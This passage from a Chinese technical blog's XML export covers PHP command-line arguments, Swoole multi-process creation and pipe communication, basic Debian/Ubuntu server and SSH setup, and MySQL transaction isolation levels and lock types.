<p>$ php -l index.php PHP Parse error:  syntax error, unexpected ‘echo’ (T_ECHO) in index.php on line 3   Parse error: syntax error, unexpected ‘echo’ (T_ECHO) in index.php on line 3 Errors parsing index.php</p>
</blockquote>
<h2 id="命令行脚本开发"><a href="#命令行脚本开发" class="headerlink" title="命令行脚本开发"></a>命令行脚本开发</h2><p>在使用PHP开发命令行脚本的时候，与开发web程序是明显不同的，在web程序中，我们可以通过改变url的参数，为PHP环境提供不同的输入，但是在命令行脚本程序中如何获取外部的输入呢？ 在使用C语言开发程序时，我们通常会在main函数中提供两个可选的参数int main(int argc, char *argv[])，这两个参数就是从命令行提供的输入参数。在PHP中，提供了两个全局变量$argc和$argv用于获取命令行输入。</p>
<ul>
<li>$argc 包含了 $argv数组包含元素的数目</li>
<li>$argv 是一个数组，包含了提供的参数，第一个参数总是脚本文件名称</li>
</ul>
<p>假设我们有一个名为console.php的命令行脚本文件</p>
<blockquote>
<p>&lt;?php echo ‘命令行参数个数: ‘ . $argc . “n”; echo “命令行参数:n”; foreach ($argv as $index =&gt; $arg) { echo “    {$index} : {$arg}n”; }</p>
</blockquote>
<p>在命令行下执行该脚本</p>
<blockquote>
<p>$ php console.php hello world 命令行参数个数: 3 命令行参数: 0 : console.php 1 : hello 2 : world</p>
</blockquote>
<p>可以看到，第0个参数是我们执行的脚本名称。需要注意的是，如果提供的第一个参数是以-开头的话，需要在前面增加–，以告诉php这后面的参数是提供给我们的脚本的，而不是php执行文件的（php -r ‘var_dump($argv);’ — -h）。 另外，在脚本中，我们可以通过php_sapi_name()函数判断是否是在命令行下运行的</p>
<blockquote>
<p>$ php -r ‘echo php_sapi_name(), PHP_EOL;’ cli</p>
</blockquote>
]]></content>
      <categories>
        <category>编程</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP扩展Swoole之进程管理</title>
    <url>/2016/12/23/php%E6%89%A9%E5%B1%95swoole%E4%B9%8B%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h2 id="Swoole：重新定义PHP"><a href="#Swoole：重新定义PHP" class="headerlink" title="Swoole：重新定义PHP"></a>Swoole：重新定义PHP</h2><h2 id="第一步安装扩展"><a href="#第一步安装扩展" class="headerlink" title="第一步安装扩展"></a>第一步安装扩展</h2><p>安装：</p>
<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><ul>
<li><a href="https://github.com/swoole/swoole-src/releases">https://github.com/swoole/swoole-src/releases</a></li>
<li><a href="http://pecl.php.net/package/swoole">http://pecl.php.net/package/swoole</a></li>
<li><a href="http://git.oschina.net/matyhtf/swoole">http://git.oschina.net/matyhtf/swoole</a></li>
</ul>
<p>下载源代码包后，在终端进入源码目录，执行下面的命令进行编译和安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd swoole</span><br><span class="line">phpize</span><br><span class="line">.&#x2F;configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<p>  编译安装成功后，修改php.ini加入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extension&#x3D;swoole.so</span><br></pre></td></tr></table></figure>
<p>    进程管理模块 查看swoole版本，在命令行里面敲</p>
<blockquote>
<p>php –ri swoole</p>
</blockquote>
<p>更多的php命令行使用，大家学习 <a href="http://php.swoole.com/wiki/PHP%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0">php命令行参数</a> ok 我们直奔主题 <strong>怎么用</strong></p>
<h2 id="多进程的创建"><a href="#多进程的创建" class="headerlink" title="多进程的创建"></a>多进程的创建</h2><p>不多说，直接上代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$worker_num &#x3D;2;&#x2F;&#x2F;创建的进程数</span><br><span class="line">for($i&#x3D;0;$i&lt;$worker_num ; $i++)&#123;</span><br><span class="line">    $process &#x3D; new swoole_process(&#39;callback_function_we_write&#39;);</span><br><span class="line">    $pid &#x3D; $process-&gt;start();</span><br><span class="line">    echo PHP_EOL . $pid;&#x2F;&#x2F;</span><br><span class="line">&#125;</span><br><span class="line">function callback_function_we_write(swoole_process $worker)&#123;</span><br><span class="line">    echo  PHP_EOL;</span><br><span class="line">    var_dump($worker);</span><br><span class="line">    echo  PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  运行结果如下</span><br><span class="line"></span><br><span class="line">5445</span><br><span class="line">object(swoole_process)#1 (3) &#123;</span><br><span class="line">  [&quot;pipe&quot;]&#x3D;&gt;</span><br><span class="line">  int(3)</span><br><span class="line">  [&quot;callback&quot;]&#x3D;&gt;</span><br><span class="line">  string(26) &quot;callback_function_we_write&quot;</span><br><span class="line">  [&quot;pid&quot;]&#x3D;&gt;</span><br><span class="line">  int(5445)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">5446</span><br><span class="line">object(swoole_process)#2 (3) &#123;</span><br><span class="line">  [&quot;pipe&quot;]&#x3D;&gt;</span><br><span class="line">  int(5)</span><br><span class="line">  [&quot;callback&quot;]&#x3D;&gt;</span><br><span class="line">  string(26) &quot;callback_function_we_write&quot;</span><br><span class="line">  [&quot;pid&quot;]&#x3D;&gt;</span><br><span class="line">  int(5446)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  可以看到，我们使用 new swoole_process 创建进程，这里需要一个参数，也就是回调函数 当我们使用 $process-&gt;start()执行后，返回这个进程的pid ，也就是 $pid. 此时子进程启动，调用回调函数，并传一个参数 也就是 swoole_process 类型的 $worker 我故意输出了 $worker 看看里面有什么，结果有三个属性</p>
<blockquote>
<p>pipe 进程的管道id 这个等说道进程间通信的时候再聊 pid 就是当前子进程的 pid 啦 callback 这个是我们自己写的回调函数名</p>
</blockquote>
<p>到这里，我们就可以用多进程玩耍了， 比如，我们可以测试多进程的运行速度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo PHP_EOL . time() ;</span><br><span class="line">$worker_num &#x3D;3;&#x2F;&#x2F;创建的进程数</span><br><span class="line">for($i&#x3D;0;$i&lt;$worker_num ; $i++)&#123;</span><br><span class="line">    $process &#x3D; new swoole_process(&#39;callback_function_we_write&#39;);</span><br><span class="line">    $pid &#x3D; $process-&gt;start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function callback_function_we_write(swoole_process $worker)&#123;</span><br><span class="line">    for($i&#x3D;0;$i&lt;100000000;$i++)&#123;&#125;</span><br><span class="line">    echo PHP_EOL . time() ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  我本机运行结果</p>
<blockquote>
<p>1435563435 // 开始时间 1435563438 //进程1 结束时间 1435563440 //进程2 结束时间 1435563440 //进程3 结束时间</p>
</blockquote>
<p>算三次 用了5s （其实一般是4s） 再玩一次</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo PHP_EOL . time() ;</span><br><span class="line">for($i&#x3D;0;$i&lt;100000000;$i++)&#123;&#125;</span><br><span class="line">for($i&#x3D;0;$i&lt;100000000;$i++)&#123;&#125;</span><br><span class="line">for($i&#x3D;0;$i&lt;100000000;$i++)&#123;&#125;</span><br><span class="line">echo PHP_EOL . time() ;</span><br></pre></td></tr></table></figure>
<p>  我本机运行结果</p>
<blockquote>
<p>1435563704 1435563712</p>
</blockquote>
<p>这次用了8s 做了这些，我想说明一个问题</p>
<blockquote>
<p><strong>并不是说 单进程 要花8s 做完的活，我们用3个进程就能将时间缩小三倍了</strong></p>
</blockquote>
<p>嘛，因为这是我以前的误区</p>
<p><strong>多进程还可以这样玩</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$funcMap&#x3D;array(&#39;methodOne&#39; , &#39;methodTwo&#39; ,&#39;methodThree&#39; );</span><br><span class="line">$worker_num &#x3D;3;&#x2F;&#x2F;创建的进程数</span><br><span class="line"></span><br><span class="line">for($i&#x3D;0;$i&lt;$worker_num ; $i++)&#123;</span><br><span class="line">    $process &#x3D; new swoole_process($funcMap[$i]);</span><br><span class="line">    $pid &#x3D; $process-&gt;start();</span><br><span class="line">    sleep(2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> while(1)&#123;</span><br><span class="line">            $ret &#x3D; swoole_process::wait();</span><br><span class="line">            if ($ret)&#123;&#x2F;&#x2F; $ret 是个数组 code是进程退出状态码，</span><br><span class="line">                $pid &#x3D; $ret[&#39;pid&#39;];</span><br><span class="line">                echo PHP_EOL.&quot;Worker Exit, PID&#x3D;&quot; . $pid . PHP_EOL;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function methodOne(swoole_process $worker)&#123;&#x2F;&#x2F; 第一个处理</span><br><span class="line">    echo $worker-&gt;callback .PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function methodTwo(swoole_process $worker)&#123;&#x2F;&#x2F; 第二个处理</span><br><span class="line">    echo $worker-&gt;callback .PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function methodThree(swoole_process $worker)&#123;&#x2F;&#x2F; 第三个处理</span><br><span class="line">    echo $worker-&gt;callback .PHP_EOL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  我多加的sleep是为了运行时看得更清楚，你也可以去掉 这里我使用了 swoole_process::wait() <a href="http://wiki.swoole.com/wiki/page/220.html">详解</a> 目的是当子进程结束后，主进程能够知道。 我们来想一个情景 过节了，妈妈要做饭，一看厨房里缺了 油，盐，糖，味精，十三香。于是吩咐儿子去小卖部买点回来。厨房这边也不能闲着，老妈要继续洗菜，切菜。等到调料买回来了，菜也洗好，切好了，开始炒，这边炒好了一个菜，就要立刻送到餐桌上。 这个情景里面，显然使用了多进程，并且各进程做的不是同样的事情。当子进程都完成了，主进程开始继续业务。 现在有了一个问题，就拿上面的情景来说，儿子去买调味料，如果发现盐没有了，或者钱不够了怎么办，如何与妈妈联系呢？ 这就是下面要说的 <strong>进程间的通信</strong></p>
<h2 id="进程间的通信"><a href="#进程间的通信" class="headerlink" title="进程间的通信"></a>进程间的通信</h2><p>Process 的通信方式有两种</p>
<blockquote>
<p>管道<br>swoole_process-&gt;write(string $data);<br>swoole_process-&gt;read(int $buffer_size=8192);<br>消息队列<br>swoole_process-&gt;useQueue();<br>swoole_process-&gt;push(string $data);<br>swoole_process-&gt;pop(int $maxsize = 8192);</p>
<p> </p>
</blockquote>
<p>我们先说说管道</p>
<h2 id="管道通讯"><a href="#管道通讯" class="headerlink" title="管道通讯"></a>管道通讯</h2><p>这里我们要再次的提及进程的创建 new swoole_process 大家请看这里 <a href="http://wiki.swoole.com/wiki/page/214.html">进程的创建</a> 第一个参数是回调函数，不说了 第二个参数含义等会我会结合例子来说 第三个参数是默认的 true，意思是创建管道，大家还记得回调函数里我特意将$worker输出看到的内容吗？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">object(swoole_process)#1 (3) &#123;</span><br><span class="line">  [&quot;pipe&quot;]&#x3D;&gt;</span><br><span class="line">  int(3)</span><br><span class="line">  [&quot;callback&quot;]&#x3D;&gt;</span><br><span class="line">  string(26) &quot;callback_function_we_write&quot;</span><br><span class="line">  [&quot;pid&quot;]&#x3D;&gt;</span><br><span class="line">  int(5445)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  关键是这里的 <strong>pipe</strong> 这个就是本进程的管道id 我们可以这样理解</p>
<blockquote>
<p>每次创建一个进程后，就会随之创建一个管道，主进程想和哪一个进程通信，就向那个进程的管道写入/读取数据。</p>
</blockquote>
<p>ok，我们看看代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$redirect_stdout &#x3D; false;&#x2F;&#x2F; 重定向输出  ; 这个参数用途等会我们看效果</span><br><span class="line">$worker_num &#x3D; 2;&#x2F;&#x2F;进程数量</span><br><span class="line">$workers &#x3D; [];&#x2F;&#x2F;存放进程用的</span><br><span class="line">for($i &#x3D; 0; $i &lt; $worker_num; $i++)&#123;</span><br><span class="line">    $process &#x3D; new swoole_process(&#39;workerFunc&#39;,$redirect_stdout );</span><br><span class="line">    $pid &#x3D; $process-&gt;start();</span><br><span class="line">    $workers[$pid] &#x3D; $process;&#x2F;&#x2F;将每一个进程的句柄存起来</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 这里是主进程哦。</span><br><span class="line">foreach($workers as $pid &#x3D;&gt; $process)&#123;&#x2F;&#x2F; $process 是子进程的句柄</span><br><span class="line">    $process-&gt;write(&quot;hello worker[$pid]\\n&quot;);&#x2F;&#x2F;子进程句柄向自己管道里写内容                  $process-&gt;write($data);</span><br><span class="line">    echo &quot;From Worker: &quot;.$process-&gt;read();&#x2F;&#x2F;子进程句柄从自己的管道里面读取信息    $process-&gt;read();</span><br><span class="line">    echo PHP_EOL.PHP_EOL;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">function workerFunc(swoole_process $worker)&#123;&#x2F;&#x2F;这里是子进程哦</span><br><span class="line">    $recv &#x3D; $worker-&gt;read();</span><br><span class="line">    echo PHP_EOL. &quot;From Master: $recv\\n&quot;;</span><br><span class="line">    &#x2F;&#x2F;send data to master</span><br><span class="line">    $worker-&gt;write(&quot;hello master , this pipe  is &quot;. $worker-&gt;pipe .&quot;;  this  pid  is &quot;.$worker-&gt;pid.&quot;\\n&quot;);</span><br><span class="line">    sleep(2);</span><br><span class="line">    $worker-&gt;exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  贴上运行结果</span><br><span class="line"></span><br><span class="line">From Master: hello worker[8205]</span><br><span class="line"></span><br><span class="line">From Worker: hello master , this pipe  is 3;  this  pid  is 8205</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">From Master: hello worker[8206]</span><br><span class="line"></span><br><span class="line">From Worker: hello master , this pipe  is 5;  this  pid  is 8206</span><br></pre></td></tr></table></figure>
<p>  喔，通讯是这样的。 首先 将所有的子进程的句柄都存到 主进程的一个数组里，数组下标就是pid。 当主进程想和哪个进程通讯，就使用那个句柄向对应管道里面 写/读 数据，这样就实现了进程间的通讯。 接着，我们稍微改一下，看看运行效果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$redirect_stdout &#x3D; true;&#x2F;&#x2F; 重定向输出  注意 这次我改成 true 了，其他没变</span><br><span class="line">$worker_num &#x3D; 2;&#x2F;&#x2F;进程数量</span><br><span class="line">$workers &#x3D; [];&#x2F;&#x2F;存放进程用的</span><br><span class="line">for($i &#x3D; 0; $i &lt; $worker_num; $i++)&#123;</span><br><span class="line">    $process &#x3D; new swoole_process(&#39;workerFunc&#39;,$redirect_stdout );</span><br><span class="line">    $pid &#x3D; $process-&gt;start();</span><br><span class="line">    $workers[$pid] &#x3D; $process;&#x2F;&#x2F;将每一个进程的句柄存起来</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 这里是主进程哦。</span><br><span class="line">foreach($workers as $pid &#x3D;&gt; $process)&#123;&#x2F;&#x2F; $process 是子进程的句柄</span><br><span class="line">    $process-&gt;write(&quot;hello worker[$pid]\\n&quot;);&#x2F;&#x2F;子进程句柄向自己管道里写内容                $process-&gt;write($data);</span><br><span class="line">    echo &quot;From Worker: &quot;.$process-&gt;read();&#x2F;&#x2F;子进程句柄从自己的管道里面读取信息    $process-&gt;read();</span><br><span class="line">    echo PHP_EOL.PHP_EOL;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">function workerFunc(swoole_process $worker)&#123;&#x2F;&#x2F;这里是子进程哦</span><br><span class="line">    $recv &#x3D; $worker-&gt;read();</span><br><span class="line">    echo PHP_EOL. &quot;From Master: $recv\\n&quot;;</span><br><span class="line">    &#x2F;&#x2F;send data to master</span><br><span class="line">    $worker-&gt;write(&quot;hello master , this pipe  is &quot;. $worker-&gt;pipe .&quot;;  this  pid  is &quot;.$worker-&gt;pid.&quot;\\n&quot;);</span><br><span class="line">    sleep(2);</span><br><span class="line">    $worker-&gt;exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  输出结果</span><br><span class="line"></span><br><span class="line">From Worker:</span><br><span class="line">From Master: hello worker[8007]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">From Worker:</span><br><span class="line">From Master: hello worker[8008]</span><br></pre></td></tr></table></figure>
<p>  诶，不一样了有没有。我们再看看创建进程时第二个参数的说明</p>
<blockquote>
<p>$redirect_stdin_stdout，重定向子进程的标准输入和输出。 启用此选项后，在进程内echo将不是打印屏幕，而是写入到管道。读取键盘输入将变为从管道中读取数据。 默认为阻塞读取。</p>
</blockquote>
<p>我来说明一下，因为创建的时候指定了true，子进程中echo的内容就到了管道里面，而不是打印在屏幕上（这一点类似于php的ob缓存机制，大家想象一下） 前面说了，进程的通讯是通过从管道里面读/写数据实现的，而 子进程 里 echo 的内容被 重定向到管道里面了，所以，主进程从管道里读到的内容，就是 子进程中 echo 的 内容。 也就造成了上面的 输出结果。</p>
]]></content>
      <categories>
        <category>WEB技术</category>
        <category>编程</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>进程管理</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux服务器的基本设置</title>
    <url>/2016/12/23/linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<p>开发网站的时候，常常需要自己配置Linux服务器。 本文记录配置Linux服务器的初步流程，也就是系统安装完成后，下一步要做的事情。如果有遗漏，欢迎大家补充。 下面的操作针对Debian/Ubuntu系统，其他Linux系统也类似，就是部分命令稍有不同。  </p>
<h2 id="第一步：root用户登录"><a href="#第一步：root用户登录" class="headerlink" title="第一步：root用户登录"></a>第一步：root用户登录</h2><p>首先，使用root用户登录远程主机（假定IP地址是192.168.55.242）。  </p>
<p>ssh <a href="mailto:&#x72;&#111;&#111;&#116;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#x35;&#53;&#46;&#50;&#x34;&#50;">&#x72;&#111;&#111;&#116;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#x35;&#53;&#46;&#50;&#x34;&#50;</a></p>
<p>  这时，命令行会出现警告，表示这是一个新的地址，存在安全风险。键入yes，表示接受。然后，就应该可以顺利登入远程主机。 接着，修改root用户的密码。  </p>
<p>passwd</p>
<h2 id="第二步：新建用户"><a href="#第二步：新建用户" class="headerlink" title="第二步：新建用户"></a>第二步：新建用户</h2><p>首先，添加一个用户组（这里假定为admin用户组）。  </p>
<p>addgroup admin</p>
<p>然后，添加一个新用户（假定为bill）。</p>
<p>useradd -d /home/bill -s /bin/bash -m bill</p>
<p>上面命令中，参数d指定用户的主目录，参数s指定用户的shell，参数m表示如果该目录不存在，则创建该目录。 接着，设置新用户的密码。  </p>
<p>passwd bill</p>
<p>将新用户（bill）添加到用户组（admin）。</p>
<p>usermod -a -G admin bill</p>
<p>  接着，为新用户设定sudo权限。</p>
<pre><code>visudo </code></pre>
<p>visudo命令会打开sudo设置文件/etc/sudoers，找到下面这一行。</p>
<p>root    ALL=(ALL:ALL) ALL</p>
<p>在这一行的下面，再添加一行。</p>
<p>root    ALL=(ALL:ALL) ALL<br>bill    ALL=(ALL) NOPASSWD: ALL</p>
<p>上面的NOPASSWD表示，切换sudo的时候，不需要输入密码，我喜欢这样比较省事。如果出于安全考虑，也可以强制要求输入密码。</p>
<p>root ALL=(ALL:ALL) ALL<br>bill ALL=(ALL:ALL) ALL</p>
<p>然后，先退出root用户的登录，再用新用户的身份登录，检查到这一步为止，是否一切正常。</p>
<p>exit<br>ssh <a href="mailto:&#98;&#105;&#108;&#x6c;&#x40;&#49;&#x32;&#x38;&#x2e;&#49;&#x39;&#x39;&#46;&#x32;&#48;&#x39;&#x2e;&#x32;&#52;&#50;">&#98;&#105;&#108;&#x6c;&#x40;&#49;&#x32;&#x38;&#x2e;&#49;&#x39;&#x39;&#46;&#x32;&#48;&#x39;&#x2e;&#x32;&#52;&#50;</a></p>
<h2 id="第三步：SSH设置"><a href="#第三步：SSH设置" class="headerlink" title="第三步：SSH设置"></a>第三步：SSH设置</h2><p>首先，确定本机有SSH公钥（一般是文件~/.ssh/id_rsa.pub），如果没有的话，使用ssh-keygen命令生成一个。 3，配置公私秘钥对</p>
<p>#生成秘钥<br>$ ssh-keygen –t rsa<br># 运行后根据提示执行<br># 输入秘钥文件的名称<br>$ Enter file in which to save the key (/root/.ssh/id_rsa):test<br># 可以设置ssh秘钥文件密码<br>$ Enter passphrase (empty for no passphrase):<br># 再一次输入刚刚的密码<br>$ Enter same passphrase again:<br># 完成后会在当前目录生成秘钥test和test.pub，这两个文件一个是私钥，一个是公钥<br># 复制公钥到规定文件，顾名思义，公钥是存放在公共的地方，也就是服务器上。私钥就是存放到私人的电脑上。<br>$ vim ~/.ssh/authorized_keys<br>复制test.pub里面的内容到该文件内，保存退出<br># 更改authorized_keys的权限为600<br>$ chmod 600 ~/.ssh/authorized_keys</p>
<p>  在本机上另开一个shell窗口，将本机的公钥拷贝到服务器的authorized_keys文件。</p>
<p>cat ~/.ssh/id_rsa.pub | ssh <a href="mailto:&#x62;&#105;&#x6c;&#108;&#64;&#x31;&#x32;&#x38;&#x2e;&#49;&#x39;&#57;&#x2e;&#50;&#48;&#x39;&#x2e;&#x32;&#52;&#50;">&#x62;&#105;&#x6c;&#108;&#64;&#x31;&#x32;&#x38;&#x2e;&#49;&#x39;&#57;&#x2e;&#50;&#48;&#x39;&#x2e;&#x32;&#52;&#50;</a> ‘mkdir -p .ssh &amp;&amp; cat - &gt;&gt; ~/.ssh/authorized_keys’</p>
<p># 或者在服务器端，运行下面命令</p>
<p>echo “ssh-rsa [your public key]“ &gt; ~/.ssh/authorized_keys</p>
<p>然后，进入服务器，编辑SSH配置文件/etc/ssh/sshd_config。</p>
<p>sudo cp /etc/ssh/sshd_config ~<br>sudo nano /etc/ssh/sshd_config</p>
<p>在配置文件中，将SSH的默认端口22改掉，可以改成从1025到65536之间的任意一个整数（这里假定为25000）。</p>
<p>Port 25000</p>
<p>然后，检查几个设置是否设成下面这样，确保去除前面的#号。</p>
<p>Protocol 2</p>
<p>PermitRootLogin no<br>PermitEmptyPasswords no<br>PasswordAuthentication no</p>
<p>RSAAuthentication yes<br>PubkeyAuthentication yes<br>AuthorizedKeysFile .ssh/authorized_keys</p>
<p>UseDNS no</p>
<p>上面主要是禁止root用户登录，以及禁止用密码方式登录。 接着，在配置文件的末尾，指定允许登陆的用户。</p>
<p>AllowUsers bill</p>
<p>保存后，退出文件编辑。 接着，改变authorized_keys文件的权限。</p>
<p>sudo chmod 600 ~/.ssh/authorized_keys &amp;&amp; chmod 700 ~/.ssh/</p>
<p>然后，重启SSHD。</p>
<p>sudo service ssh restart</p>
<p># 或者</p>
<p>sudo /etc/init.d/ssh restart</p>
<p>下面的一步是可选的。在本机~/.ssh文件夹下创建config文件，内容如下。</p>
<p>Host s1<br>HostName 128.199.209.242<br>User bill<br>Port 25000</p>
<p>最后，在本机另开一个shell窗口，测试SSH能否顺利登录。</p>
<p>ssh s1</p>
<h2 id="第四步：运行环境配置"><a href="#第四步：运行环境配置" class="headerlink" title="第四步：运行环境配置"></a>第四步：运行环境配置</h2><p>首先，检查服务器的区域设置。</p>
<p>locale</p>
<p>如果结果不是en_US.UTF-8，建议都设成它。</p>
<p># vi /etc/sysconfig/i18n<br>LANG=”en_US.UTF-8”<br>SYSFONT=”latarcyrheb-sun16”</p>
<p>还有一种方法就是改变环境变量LANG</p>
<p>#export LANG=”en_US.UTF-8”</p>
<p>不过这样一重新启动就没有，所以要加到/etc/profile里面，这样一开机就会运行这个变量了。</p>
]]></content>
      <categories>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>深入浅出MySQL事务处理和锁机制</title>
    <url>/2016/12/21/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E4%BA%8B%E5%8A%A1%E5%A4%84%E7%90%86%E5%92%8C%E9%94%81%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>[caption id=”” align=”aligncenter” width=”675”]<img src="http://7xnd02.com1.z0.glb.clouddn.com/632106-20150910144933794-352735227.png"> 锁管理机制[/caption]   <strong>1. 事务处理和并发性</strong> 1.1. 基础知识和相关概念 1 ）全部的表类型都可以使用锁，但是只有 InnoDB 和 BDB 才有内置的事务功能。 2 ）使用 begin 开始事务，使用 commit 结束事务，中间可以使用 rollback 回滚事务。 3 ）在默认情况下， InnoDB 表支持一致读。 SQL 标准中定义了 4 个隔离级别： read uncommited ， read commited ， repeatable read ， serializable 。 read uncommited 即脏读，一个事务修改了一行，另一个事务也可以读到该行。 如果第一个事务执行了回滚，那么第二个事务读取的就是从来没有正式出现过的值。 ? read commited 即一致读，试图通过只读取提交的值的方式来解决脏读的问题，但是这又引起了不可重复读取的问题。 一个事务执行一个查询，读取了大量的数据行。在它结束读取之前，另一个事务可能完成了对数据行的更改。当第一个事务试图再次执行同一个查询，服务器就会返回不同的结果。 repeatable read 即可重复读，在一个事务对数据行执行读取或写入操作时锁定了这些数据行。 但是这种方式又引发了幻想读的问题。 因为只能锁定读取或写入的行，不能阻止另一个事务插入数据，后期执行同样的查询会产生更多的结果。 serializable 模式中，事务被强制为依次执行。这是 SQL 标准建议的默认行为。 4 ）如果多个事务更新了同一行，就可以通过回滚其中一个事务来解除死锁。 5 ） MySQL 允许利用 set transaction 来设置隔离级别。 6 ）事务只用于 insert 和 update 语句来更新数据表，不能用于对表结构的更改。执行一条更改表结构或 begin 则会立即提交当前的事务。 7 ）所有表类型都支持表级锁，但是 MyISAM 只支持表级锁。 8 ）有两种类型的表级锁：读锁和写锁。 读锁是共享锁，支持并发读，写操作被锁。 写锁是独占锁，上锁期间其他线程不能读表或写表。 8 ）如果要支持并发读写，建议采用 InnoDB 表，因为它是采用行级锁，可以获得更多的更新性能。 9 ）很多时候，可以通过经验来评估什么样的锁对应用程序更合适，不过通常很难说一个锁比别的更好，这全都要依据应用程序来决定，不同的地方可能需要不同的锁。当前 MySQL 已经支持 ISAM, MyISAM, MEMORY (HEAP) 类型表的表级锁了， BDB 表支持页级锁， InnoDB 表支持行级锁。 10 ） MySQL 的表级锁都是写锁优先，而且是采用排队机制，这样不会出现死锁的情况。对于 InnoDB 和 BDB 存储引擎来说，是可能产生死锁的。这是因为 InnoDB 会自动捕获行锁， BDB 会在执行 SQL 语句时捕获页锁的，而不是在事务的开始就这么做。 <strong>1.2 不同锁的优缺点及选择</strong> 行级锁的优点及选择 ： 1 ）在很多线程请求不同记录时减少冲突锁。 2 ）事务回滚时减少改变数据。 3 ）使长时间对单独的一行记录加锁成为可能。 行级锁的缺点 ： 1 ）比页级锁和表级锁消耗更多的内存。 2 ）当在大量表中使用时，比页级锁和表级锁更慢，因为他需要请求更多的所资源。 3 ）当需要频繁对大部分数据做 GROUP BY 操作或者需要频繁扫描整个表时，就明显的比其它锁更糟糕。 4 ）使用更高层的锁的话，就能更方便的支持各种不同的类型应用程序，因为这种锁的开销比行级锁小多了。 5 ）可以用应用程序级锁来代替行级锁，例如 MySQL 中的 GET_LOCK() 和 RELEASE_LOCK() 。但它们是劝告锁（原文： These are advisory locks ），因此只能用于安全可信的应用程序中。 6 ）对于 InnoDB 和 BDB 表， MySQL 只有在指定用 LOCK TABLES 锁表时才使用表级锁。在这两种表中，建议最好不要使用 LOCK TABLES ，因为 InnoDB 自动采用行级锁， BDB 用页级锁来保证事务的隔离。 表锁的优点及选择： 1 ）很多操作都是读表。 2 ）在严格条件的索引上读取和更新，当更新或者删除可以用单独的索引来读取得到时： UPDATE tbl_name SET column=value WHERE unique_key_col=key_value;DELETE FROM tbl_name WHERE unique_key_col=key_value; 3 ） SELECT 和 INSERT 语句并发的执行，但是只有很少的 UPDATE 和 DELETE 语句。 4 ）很多的扫描表和对全表的 GROUP BY 操作，但是没有任何写表。 表锁的缺点： 1 ）一个客户端提交了一个需要长时间运行的 SELECT 操作。 2 ）其他客户端对同一个表提交了 UPDATE 操作，这个客户端就要等到 SELECT 完成了才能开始执行。 3 ）其他客户端也对同一个表提交了 SELECT 请求。由于 UPDATE 的优先级高于 SELECT ，所以 SELECT 就会先等到 UPDATE 完成了之后才开始执行，它也在等待第一个 SELECT 操作。 <strong>1.3. 如何避免锁的资源竞争</strong> 1 ）让 SELECT 速度尽量快，这可能需要创建一些摘要表。 2 ）启动 mysqld 时使用参数 –low-priority-updates 。这就会让更新操作的优先级低于 SELECT 。 这种情况下，在上面的假设中，第二个 SELECT 就会在 INSERT 之前执行了，而且也无需等待第一个 SELECT 了。 3 ）可以执行 SET LOW_PRIORITY_UPDATES=1 命令，指定所有的更新操作都放到一个指定的链接中去完成。 4 ）用 LOW_PRIORITY 属性来降低 INSERT ， UPDATE ， DELETE 的优先级。 5 ）用 HIGH_PRIORITY 来提高 SELECT 语句的优先级。 6 ）从 MySQL 3.23.7 开始，可以在启动 mysqld 时指定系统变量 max_write_lock_count 为一个比较低的值，它能强制临时地提高表的插入数达到一个特定值后的所有 SELECT 操作的优先级。它允许在 WRITE 锁达到一定数量后有 READ 锁。 7 ）当 INSERT 和 SELECT 